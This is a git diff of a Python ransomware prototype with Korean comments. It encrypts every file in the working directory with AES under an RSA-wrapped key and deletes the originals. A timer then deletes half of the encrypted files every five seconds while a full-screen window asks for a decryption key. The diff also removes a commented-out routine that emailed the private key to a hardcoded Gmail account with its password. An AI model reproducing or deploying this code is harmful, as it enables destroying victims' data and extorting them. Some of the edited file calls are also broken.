@@ -1,4 +1,4 @@
-from builtins import int, input, len, round, range
+from builtins import len, exit, round, str, bytes, range
 
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
@@ -8,21 +8,19 @@ import glob
 import os
 import threading
 from time import sleep
-
+'''
+암호화 / 복호화 기존에 1,2,3 
+while 루프 나오던 건 main_test
+gui랑 통합하고 있는 게 integrate_gui 
+'''
 #gui 라이브러리
 import tkinter
 from ui import thanos
 from tkinter.ttk import Label
 from PIL import Image, ImageTk
 
-import binascii
-#나중에 쓰면 좋을 것 같은 라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
-import smtplib
-import uuid
-from email.mime.text import MIMEText
 
-
-# 버튼클릭시 복호화될수 있게
+# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
 def key_submit():
     pw = str(password.get())
     label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
@@ -31,8 +29,6 @@ def key_submit():
     label4.destroy()
     password.destroy()
 
-
-# gui 창 객체입니다
 window = tkinter.Tk()
 window.title("ransomware")
 window.state('zoomed')  # maximize the window
@@ -55,13 +51,15 @@ password.pack()
 pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
 pwbutton.pack()
 
-image = tkinter.PhotoImage(file="ui/face.png")
+image = tkinter.PhotoImage(file="../ui/face.png")
 
 label5 = tkinter.Label(window, image=image)
 label5.pack()
 
 
 iv = os.urandom(16)
+
+#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
 def list_files(path, ext=None):
     filelist=[]
@@ -78,6 +76,8 @@ def list_files(path, ext=None):
     print("filelist: \n", filelist)
     return filelist
 
+#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
+
 def startTimer():
     print("파일 삭제를 시작합니다")
     #5초에 한번씩 파일 삭제
@@ -85,6 +85,7 @@ def startTimer():
     sleep(5)
     remove_files(os.getcwd())
 
+# 암호화된 파일 삭제하는 함수
 def remove_files(path,ext=None):
     #label6 = thanos.AnimatedGIF(window, "thanos1.gif")
     #label6.pack()
@@ -100,27 +101,28 @@ def remove_files(path,ext=None):
             elif name.endswith(ext):
                 remove_filelist.append(name)
     print("remove_filelist: \n", remove_filelist)
-
-    if(len(remove_filelist)>2):
+    # 파일이 2개 이상일 경우
+    if (len(remove_filelist) >= 2):
         n = 0
-        if((len(remove_filelist) / 2 ) % 2 == 0):
-            n=round(len(remove_filelist)/2) #정수로 변환
+        if (len(remove_filelist) % 2 == 0):
+            n = round(len(remove_filelist) / 2)  # 정수로 변환
             print("지울 파일 개수: ", n)
         else:
-            n=round(len(remove_filelist)/2)-1
+            n = round(len(remove_filelist) / 2) - 1
             print("지울 파일 개수: ", n)
 
         for i in range(n):
             print(remove_filelist[i])
             os.remove(remove_filelist[i])
         print("파일 중 절반이 삭제되었습니다.")
-    #파일이 1개 or 2개 남았을 경우
-    elif(len(remove_filelist)>0):
+
+    #파일이 1개 남았을 경우
+    elif(len(remove_filelist) == 1):
         os.remove(remove_filelist[0])
+        print("더 이상 삭제할 파일이 없습니다")
+        exit(0)
+    #맨 처음 파일이 0개일 경우
     else:
-#        for i in range(2):
-#            os.remove(remove_filelist[i])
-#        print("파일 중 절반이 삭제되었습니다.")
         print("더 이상 삭제할 파일이 없습니다")
         exit(0)
 
@@ -129,6 +131,8 @@ def remove_files(path,ext=None):
     #label7.pack()
 
     threading.Timer(5, remove_files, [os.getcwd()]).start()
+
+#/////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수
 
 def enc(key, cipher, in_filename, out_filename=None):
 
@@ -149,7 +153,7 @@ def enc(key, cipher, in_filename, out_filename=None):
     # 먼저, 바이너리 형식으로 파일을 읽어온다
     # 읽어온 것은 data로 저장
 
-    with open(in_filename, 'rb') as infile:
+    with os.open(in_filename, 'rb') as infile:
         # 일단 읽어온 것을 출력해보자
         data = infile.read()
 
@@ -164,11 +168,11 @@ def enc(key, cipher, in_filename, out_filename=None):
         print("2. After Padding Message was: ")
         print(data)
 
-        with open(out_filename, 'wb') as outfile:
+        with os.open(out_filename, 'wb') as outfile:
             pass
 
         #이어쓰기 모드
-        with open(out_filename, 'ab') as outfile:
+        with os.open(out_filename, 'ab') as outfile:
             #RSA : 길이 64832 만큼 파일의 크기를 넣어줌. ex)0000...00130 (130바이트)
             outfile.write(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode())
             print('\ndata size : ',len(b'0'*(64832-len(str(sizeOfData)))+str(sizeOfData).encode()))
@@ -184,7 +188,7 @@ def enc(key, cipher, in_filename, out_filename=None):
             outfile.write(e_data)
 
     # write가 완료된 상태에서 out_file을 읽어보자
-    with open(out_filename, 'rb') as result:
+    with os.open(out_filename, 'rb') as result:
         print("4. encryption result is: ", out_filename)
         print(result.read())
 
@@ -199,7 +203,7 @@ def dec( cipher, in_filename, out_filename):
         out_filename = os.path.splitext(in_filename)[0]
     print(out_filename)
 
-    with open(in_filename, 'rb') as infile:
+    with os.open(in_filename, 'rb') as infile:
         e_data = infile.read()
         print('size : ',e_data[:64832])
         #RSA : 파일의 크기와 암호화된 AES 키 추출
@@ -215,7 +219,7 @@ def dec( cipher, in_filename, out_filename):
         print("1. Cipher was: ")
         print(e_data)
 
-        with open(out_filename, 'wb') as outfile:
+        with os.open(out_filename, 'wb') as outfile:
             decryptor = AES.new(aes_key_dec, mode, iv)
 
             d_data = decryptor.decrypt(e_data)
@@ -242,12 +246,13 @@ def dec( cipher, in_filename, out_filename):
     # write가 완료된 상태에서 out_file을 읽어보자
     # 읽을 때 rb가 아니라 r로 읽으면
     # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
-    with open(out_filename, 'rb') as result:
+    with os.open(out_filename, 'rb') as result:
         print("4. decryption result is: ", out_filename)
         print(result.read())
 
     print("---END DECRYPTION : AES")
 
+#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////메인함수
 
 if __name__ == "__main__":
 
@@ -260,70 +265,29 @@ if __name__ == "__main__":
     private_key = rsa_key.export_key()
     print("비밀키는 : ", private_key)
 
-    '''
-    #고유 식별자 번호
-    UUID = uuid.uuid4()
-
-    #smtp 로그인 후 비밀키 전송
-    smtp = smtplib.SMTP('smtp.gmail.com', 587)
-    smtp.ehlo()  # say Hello
-    smtp.starttls()  # TLS 사용시 필요
-    smtp.login('secureantdd@gmail.com', 'antdd1234')    #확인은 이 계정에서!
-
-    msg = MIMEText(str(UUID) + '/' + private_key.decode())  # 고유식별자번호 / RSA개인키 를 메세지로 전송함
-    msg['Subject'] = '테스트'
-    msg['To'] = 'secureantdd@gmail.com'
-    smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())
-
-    smtp.quit()
-    '''
 
     #timer 테스트
     enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
+    original_targetlist = enc_targetlist#원본파일 삭제시 사용
     # 나중에 전체 트래킹 하는 법 알아야함
     print("enc_targetlist: \n", enc_targetlist)
+    print("original_targetlist: \n", original_targetlist)
+    i = 0
     for enc_target in enc_targetlist:
         if enc_target.split('.')[-1] == 'antdd':
             continue
         enc(key, cipher, enc_target, out_filename=None)
+        os.remove(original_targetlist[i])#원본 파일을 삭제
+        i += 1
 
     # 타이머 시작 코드
     th1 = threading.Thread(target=startTimer)
     th1.start()
-
     # gui 시작 코드
     th2 = threading.Thread(window.mainloop())
     th2.start()
 
 
-    '''
-    while True:
-        menu = int(input("1. 암호화\t2. 복호화\t3. 나가기\n"))
-        if (menu == 1):
-            enc_targetlist = list_files(os.getcwd())    #os.getcwd는 해당 폴더에서 가져옴.
-            #나중에 전체 트래킹 하는 법 알아야함
-            print("enc_targetlist: \n", enc_targetlist)
-            for enc_target in enc_targetlist:
-                if enc_target.split('.')[-1]=='antdd':
-                    continue
-                enc(key, cipher,enc_target, out_filename=None)
-                #remove_files(os.getcwd())
-        elif (menu == 2):
-            dec_targetlist = list_files(os.getcwd(), '.antdd')
-            print("dec_targetlist: \n", dec_targetlist)
-            for dec_target in dec_targetlist:
-                #print(os.path.splitext(dec_target)[0])
-                #x = get_tmp(os.path.splitext(dec_target)[0])
-                print(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
-                #x = get_tmp(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
-                dec(cipher,dec_target, out_filename=None)  # x 없어야함
-        elif (menu == 3):
-            break
-        else:
-            continue
-    '''
-    #해당 파일들은 확인 끝남
-    #text(key, 'target.txt')
-    #text(key, '컴보.docx')
-    #image(key, 'family.jpg')
-    #image(key, '짱구얌.png')
+
+
+
